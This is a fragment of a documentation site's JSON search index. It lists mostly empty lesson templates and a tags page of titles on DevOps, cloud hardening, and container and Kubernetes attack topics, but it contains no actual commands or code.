variables"},{"location":"content/en/docs/hack/linux/linux-environment-variables/#overview","text":"","title":"Overview"},{"location":"content/en/docs/hack/linux/linux-environment-variables/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/hack/linux/linux-environment-variables/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/hack/linux/linux-environment-variables/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/hack/linux/linux-environment-variables/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/hack/linux/linux-environment-variables/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/hack/linux/useful-linux-commands/","tags":["linux"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"Useful linux commands"},{"location":"content/en/docs/hack/linux/useful-linux-commands/#overview","text":"","title":"Overview"},{"location":"content/en/docs/hack/linux/useful-linux-commands/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/hack/linux/useful-linux-commands/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/hack/linux/useful-linux-commands/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/hack/linux/useful-linux-commands/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/hack/linux/useful-linux-commands/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/hack/pentesting/network/44134-pentesting-tiller-helm/","tags":["pentesting","network"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"44134 pentesting tiller helm"},{"location":"content/en/docs/hack/pentesting/network/44134-pentesting-tiller-helm/#overview","text":"","title":"Overview"},{"location":"content/en/docs/hack/pentesting/network/44134-pentesting-tiller-helm/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/hack/pentesting/network/44134-pentesting-tiller-helm/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/hack/pentesting/network/44134-pentesting-tiller-helm/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/hack/pentesting/network/44134-pentesting-tiller-helm/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/hack/pentesting/network/44134-pentesting-tiller-helm/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/secure/secure-aws/","tags":["cloud","aws"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"Secure aws"},{"location":"content/en/docs/secure/secure-aws/#overview","text":"","title":"Overview"},{"location":"content/en/docs/secure/secure-aws/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/secure/secure-aws/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/secure/secure-aws/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/secure/secure-aws/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/secure/secure-aws/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/secure/secure-circleci/","tags":["cloud","circleci"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"Secure circleci"},{"location":"content/en/docs/secure/secure-circleci/#overview","text":"","title":"Overview"},{"location":"content/en/docs/secure/secure-circleci/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/secure/secure-circleci/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/secure/secure-circleci/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/secure/secure-circleci/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/secure/secure-circleci/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/secure/secure-github/","tags":["cloud","github"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6 v","title":"Secure github"},{"location":"content/en/docs/secure/secure-github/#overview","text":"","title":"Overview"},{"location":"content/en/docs/secure/secure-github/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/secure/secure-github/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/secure/secure-github/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/secure/secure-github/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/secure/secure-github/#whatsnext","text":"v","title":"Whatsnext"},{"location":"content/en/docs/secure/secure-jenkins/","tags":["cloud","jenkins"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"Secure jenkins"},{"location":"content/en/docs/secure/secure-jenkins/#overview","text":"","title":"Overview"},{"location":"content/en/docs/secure/secure-jenkins/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/secure/secure-jenkins/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/secure/secure-jenkins/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/secure/secure-jenkins/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/secure/secure-jenkins/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/secure/secure-kubernetes/","tags":["kubernetes","k8s"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"Secure kubernetes"},{"location":"content/en/docs/secure/secure-kubernetes/#overview","text":"","title":"Overview"},{"location":"content/en/docs/secure/secure-kubernetes/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/secure/secure-kubernetes/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/secure/secure-kubernetes/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/secure/secure-kubernetes/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/secure/secure-kubernetes/#whatsnext","text":"","title":"Whatsnext"},{"location":"tags/","text":"Tags \u00b6 Following is a list of relevant tags: ArgoCD \u00b6 ArgoCD Bitbucket \u00b6 Bitbucket Tools \u00b6 DevOps Tools List antipattern \u00b6 Devops kubernetes deployment antipatterns aws \u00b6 Secure aws circleci \u00b6 Secure circleci cloud \u00b6 Secure aws Secure circleci Secure github Secure jenkins deployment \u00b6 Devops kubernetes deployment antipatterns docker \u00b6 Abusing docker socket for privilege escalation Apparmor Authz authn docker access authorization plugin Docker privileged Docker release agent cgroups escape Namespaces Release agent exploit relative paths to pids Seccomp Sensitive mounts github \u00b6 Secure github jenkins \u00b6 Secure jenkins k8s \u00b6 Devops kubernetes deployment antipatterns Devops kubernetes Abusing roles clusterroles in kubernetes Attacking kubernetes from inside a pod Exposing services in kubernetes Kubernetes access to other clouds Kubernetes enumeration Kubernetes namespace escalation Kubernetes network attacks Kubernetes role based access control Pentesting kubernetes services Secure kubernetes kubernetes \u00b6 Devops kubernetes deployment antipatterns Devops kubernetes Abusing roles clusterroles in kubernetes Attacking kubernetes from inside a pod Exposing services in kubernetes Kubernetes access to other clouds Kubernetes enumeration Kubernetes namespace escalation Kubernetes network attacks Kubernetes role based access control Pentesting kubernetes services Secure kubernetes linux \u00b6 Abusing docker socket for privilege escalation Apparmor Authz authn docker access authorization plugin Docker privileged Docker release agent cgroups escape Namespaces Release agent exploit relative paths to pids Seccomp Sensitive mounts Checklist linux privilege escalation Ddexec Linux capabilities Linux environment variables Useful linux commands microservices \u00b6 Istio Service Mesh monoliths \u00b6 Istio Service Mesh network \u00b6 44134 pentesting tiller helm pentesting \u00b6 44134 pentesting tiller helm service mesh \u00b6 Istio Service Mesh task \u00b6 Production Deployment","title":"Tags"},{"location":"tags/#tags","text":"Following is a list of relevant tags:","title":"Tags"},{"location":"tags/#argocd","text":"ArgoCD","title":"ArgoCD"},{"location":"tags/#bitbucket","text":"Bitbucket","title":"Bitbucket"},{"location":"tags/#tools","text":"DevOps Tools List","title":"Tools"},{"location":"tags/#antipattern","text":"Devops kubernetes deployment antipatterns","title":"antipattern"},{"location":"tags/#aws","text":"Secure aws","title":"aws"},{"location":"tags/#circleci","text":"Secure circleci","title":"circleci"},{"location":"tags/#cloud","text":"Secure aws Secure circleci Secure github Secure jenkins","title":"cloud"},{"location":"tags/#deployment","text":"Devops kubernetes deployment antipatterns","title":"deployment"},{"location":"tags/#docker","text":"Abusing docker socket for privilege escalation Apparmor Authz authn docker access authorization plugin Docker privileged Docker release agent cgroups escape Namespaces Release agent exploit relative paths to pids Seccomp Sensitive mounts","title":"docker"},{"location":"tags/#github","text":"Secure github","title":"github"},{"location":"tags/#jenkins","text":"Secure jenkins","title":"jenkins"},{"location":"tags/#k8s","text":"Devops kubernetes deployment antipatterns Devops kubernetes Abusing roles clusterroles in kubernetes Attacking kubernetes from inside a pod Exposing services in kubernetes Kubernetes access to other clouds Kubernetes enumeration Kubernetes namespace escalation Kubernetes network attacks Kubernetes role based access control Pentesting kubernetes services Secure kubernetes","title":"k8s"},{"location":"tags/#kubernetes","text":"Devops kubernetes deployment antipatterns Devops kubernetes Abusing roles clusterroles in kubernetes Attacking kubernetes from inside a pod Exposing services in kubernetes Kubernetes access to other clouds Kubernetes enumeration Kubernetes namespace escalation Kubernetes network attacks Kubernetes role based access control Pentesting kubernetes services Secure kubernetes","title":"kubernetes"},{"location":"tags/#linux","text":"Abusing docker socket for privilege escalation Apparmor Authz authn docker access authorization plugin Docker privileged Docker release agent cgroups escape Namespaces Release agent exploit relative paths to pids Seccomp Sensitive mounts Checklist linux privilege escalation Ddexec Linux capabilities Linux environment variables Useful linux commands","title":"linux"},{"location":"tags/#microservices","text":"Istio Service Mesh","title":"microservices"},{"location":"tags/#monoliths","text":"Istio Service Mesh","title":"monoliths"},{"location":"tags/#network","text":"44134 pentesting tiller helm","title":"network"},{"location":"tags/#pentesting","text":"44134 pentesting tiller helm","title":"pentesting"},{"location":"tags/#service-mesh","text":"Istio Service Mesh","title":"service mesh"},{"location":"tags/#task","text":"Production Deployment","title":"task"}]}